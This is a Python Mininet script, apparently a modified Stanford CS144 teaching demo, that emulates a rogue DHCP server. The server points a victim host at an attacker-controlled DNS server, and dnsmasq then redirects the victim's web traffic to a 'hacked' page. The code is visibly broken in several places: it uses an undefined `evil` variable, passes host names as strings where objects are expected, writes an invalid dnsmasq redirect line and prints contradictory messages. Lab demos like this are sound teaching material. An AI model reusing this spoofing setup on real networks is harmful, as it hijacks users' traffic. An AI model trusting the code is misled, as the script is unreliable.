#!/usr/bin/python3

"""
Rogue DHCP server demo for Stanford CS144 with NAT integration and user interaction, modified for Raspberry Pi network (192.168.1.X).

This scenario simulates a network where a rogue DHCP server (evil)
provides malicious information to a victim host (h1). The evil host also
acts as a rogue DNS server, redirecting traffic to a pre-defined webpage
after the attack.

We utilize a NAT gateway to connect the network to the internet.
"""

from mininet.net import Mininet
from mininet.topo import Topo
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.util import quietRun
from mininet.log import setLogLevel, info
from mininet.term import makeTerms

# Import for NAT functionality
from mininet.examples.nat import NAT

from sys import exit, stdin, argv
from re import findall
from time import sleep
import os

def check_required():
    "Check for required executables"
    required = [ 'udhcpd', 'udhcpc', 'dnsmasq', 'curl', 'firefox' ]
    for r in required:
        if not quietRun( 'which ' + r ):
            print('* Installing', r)
            print(quietRun( 'apt-get install -y ' + r ))
            if r == 'dnsmasq':
                # Don't run dnsmasq by default!
                print(quietRun( 'update-rc.d dnsmasq disable' ))

class DHCPTopo( Topo ):
    """Topology for DHCP Demo:
       h1 - switch - evil (rogue)
                     |
                   dhcp (legitimate)
                     |
                   NAT (internet)
    """
    def __init__( self, *args, **kwargs ):
        Topo.__init__( self, *args, **kwargs )
        # Adjust IP addresses to fit 192.168.1.X network
        client = self.addHost( 'h1', ip='0.0.0.0/0' )  # Let DHCP assign IP
        switch = self.addSwitch( 's1' )
        dhcp = self.addHost( 'dhcp', ip='192.168.1.50/24' )
        evil = self.addHost( 'evil', ip='192.168.1.66/24' )
        nat = self.addHost( 'nat', ip='192.168.1.1/24' )  # NAT gateway

        self.addLink( client, switch )
        self.addLink( evil, switch )
        self.addLink( dhcp, switch, bw=10, delay='500ms' )
        self.addLink( nat, switch )

# DHCP server functions and data

DNSTemplate = """
start       192.168.1.10
end     192.168.1.90
option  subnet  255.255.255.0
option  domain  local
option  lease   7  # seconds
option  dns 192.168.1.66  # Evil DNS server
# interface h1-eth0
"""

def make_dhcp_config( filename, intf, gw, dns ):
    "Create a DHCP configuration file"
    config = (
        'interface %s' % intf,
        DNSTemplate,
        'option router %s' % gw,
        'option dns %s' % dns,
        '' )
    with open( filename, 'w' ) as f:
        f.write( '\n'.join( config ) )

def start_dhcp_server( host, gw, dns ):
    "Start DHCP server on host with specified DNS server"
    info( '* Starting DHCP server on', host, 'at', host.IP(), '\n' )
    dhcp_config = '/tmp/%s-udhcpd.conf' % host
    make_dhcp_config( dhcp_config, host.defaultIntf(), gw, dns )
    host.cmd( 'udhcpd -f', dhcp_config,
              '1>/tmp/%s-dhcp.log 2>&1  &' % host )

def stop_dhcp_server( host ):
    "Stop DHCP server on host"
    info( '* Stopping DHCP server on', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %udhcpd' )

def hacked_webpage(path):
    """Creates a simple HTML file that displays a "hacked" message"""
    content = """<html><body><h1>YOU HAVE BEEN HACKED!!!</h1></body></html>"""
    with open(path, 'w') as f:
        f.write(content)

def run_demo():
    "Create and run the test network"

    # Create the network
    net = Mininet( topo=DHCPTopo(), controller=None, build=False )

    # Check for required programs
    check_required()

    # Configure NAT
    nat = net.get('nat')
    nat.configure()

    # Configure evil host as DNS server (redirecting to hacked webpage)
    evil_dir = '/var/www/html/evil'  # Directory for hacked webpage
    evil.cmd('apt-get install -y dnsmasq')  # Ensure dnsmasq is installed on evil
    evil.cmd('mkdir -p ' + evil_dir)  # Create directory for webpage
    hacked_webpage(evil_dir + '/index.html')  # Create hacked webpage
    evil.cmd('echo "address=/.evil/ ' + evil_dir + '/index.html" >> /etc/dnsmasq.conf')  # Redirect DNS to hacked page
    evil.cmd('service dnsmasq restart')  # Restart dnsmasq with new config

    # Start the network
    net.build()
    net.start()

    # User Interaction
    print( "Network started. h1 (victim) has no internet yet." )
    print( "h1 can access the internet before the attack (e.g., try pinging 8.8.8.8)" )
    input("Press Enter to simulate DHCP request from h1 and launch the attack...")

    # Start DHCP servers (legitimate and evil)
    start_dhcp_server( 'dhcp', '192.168.1.1', '8.8.8.8' )  # Legitimate DHCP with external DNS
    start_dhcp_server( 'evil', '192.168.1.1', '192.168.1.66' )  # Evil DHCP with evil DNS

    print( "h1 should now have internet access (evil DNS server in control)." )
    print( "h1 will be redirected to a 'hacked' webpage when trying to browse (e.g., try curl amazon.com)" )
    input("Press Enter to stop the network...")

    # Stop DHCP servers and clean up
    stop_dhcp_server( 'dhcp' )
    stop_dhcp_server( 'evil' )
    evil.cmd('rm -rf ' + evil_dir)  # Remove hacked webpage directory
    evil.cmd('service dnsmasq stop')  # Stop dnsmasq
    net.stop()

if __name__ == '__main__':
    run_demo()
